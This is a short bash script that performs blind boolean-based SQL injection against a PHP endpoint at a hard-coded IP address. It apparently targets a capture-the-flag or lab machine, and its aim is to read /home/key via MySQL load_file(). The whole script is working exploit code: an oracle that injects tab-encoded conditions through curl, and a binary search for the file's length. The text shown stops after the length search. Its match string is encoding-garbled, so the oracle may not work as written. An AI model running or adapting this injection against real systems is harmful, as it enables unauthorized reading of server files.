#!/bin/bash
# Blind boolean-based SQLi to extract /home/key
OUTDIR="/home/kali/桌面/hack/8.140.206.93/flags"
BASE_URL="http://8.140.206.93:81/vulnerabilities/fu1.php"

# Oracle function: returns 1 if condition is true (card shows data), 0 if false
# True = card shows "SQL注入" (article content present)
# False = card shows empty title
oracle() {
  local condition="$1"
  local url="${BASE_URL}?id=1')%09and%09${condition}%23"
  local resp=$(curl -s "$url")
  # Check if the card-title contains actual content
  if echo "$resp" | grep -q "SQLע��"; then
    echo 1
  else
    echo 0
  fi
}

echo "=== Checking if /home/key is readable ==="
result=$(oracle "length(load_file('/home/key'))>0")
echo "File readable: $result"

if [ "$result" != "1" ]; then
  echo "File not readable or doesn't exist"
  exit 1
fi

# Find file length using binary search
echo ""
echo "=== Finding file length ==="
lo=0
hi=500
while [ $lo -lt $hi ]; do
  mid=$(( (lo + hi + 1) / 2 ))
  r=$(oracle "length(load_file('/home/key'))>=$mid")
  echo "  Length >= $mid: $r"
  if [ "$r" = "1" ]; then
    lo=$mid
  else
    hi=$((mid - 1))
  fi
done
LEN=$lo
echo "File length: $LEN"
